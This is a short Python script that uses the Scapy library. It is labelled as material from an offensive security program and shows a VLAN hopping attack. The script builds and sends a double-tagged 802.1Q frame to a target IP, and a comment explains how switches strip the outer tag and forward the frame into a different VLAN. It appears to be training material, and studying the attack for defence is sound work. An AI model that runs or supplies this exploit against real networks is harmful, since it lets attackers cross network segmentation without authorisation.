# Offensive Security Software
# SSE Program
# Attack: VLAN Hopping
# Date: January 31, 2016

from scapy.all import *

packet = Ether(dst="c0:d3:de:ad:be:ef") / \
         Dot1Q(vlan=1) / \
         Dot1Q(vlan=2) / \
         IP(dst="192.168.13.3") / \
         ICMP()

sendp(packet)


'''
First we set the header including out VLAN tag into the packet and afterwards
the one of the destination host.  The switch will remove the first tag, then
decide how to react on the packet, seeing the second tag with VLAN id2, he
decides to forward it to that vlan.  On some switches this attack will only
be successful if its connected to other VLAN enabled switches via stacking,
otherwise they use port based VLAN
'''

